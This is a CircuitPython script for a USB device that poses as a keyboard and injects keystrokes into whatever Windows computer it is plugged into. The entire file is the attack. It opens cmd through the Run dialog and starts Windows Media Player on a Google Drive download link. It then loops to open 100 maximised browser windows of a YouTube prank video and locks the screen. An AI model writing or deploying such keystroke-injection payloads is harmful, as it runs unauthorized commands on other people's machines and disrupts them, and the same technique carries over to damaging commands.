import time
import os
import usb_hid
from adafruit_hid.keycode import Keycode
from adafruit_hid.keyboard import Keyboard
from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS

if not 'network.txt' in os.listdir():
    time.sleep(0.8)
    keyboard = Keyboard(usb_hid.devices)
    layout = KeyboardLayoutUS(keyboard)

    keyboard.send(Keycode.WINDOWS, Keycode.R)
    time.sleep(0.11)

    layout.write("cmd\n")

    time.sleep(0.1)

    layout.write("e:\n")
    time.sleep(0.01)
    layout.write("start wmplayer https://drive.google.com/u/0/uc?id=0B-klwLEjaXWcZHR5SmJJWEwtYnc&export=download")
    time.sleep(0)
    keyboard.send(Keycode.ENTER)
    time.sleep(0)
    layout.write("for /l %x in (1,1,100) do start /max https://youtu.be/dQw4w9WgXcQ")
    time.sleep(0.4)
    keyboard.send(Keycode.ENTER)
    time.sleep(4)
    keyboard.send(Keycode.WINDOWS, Keycode.L)
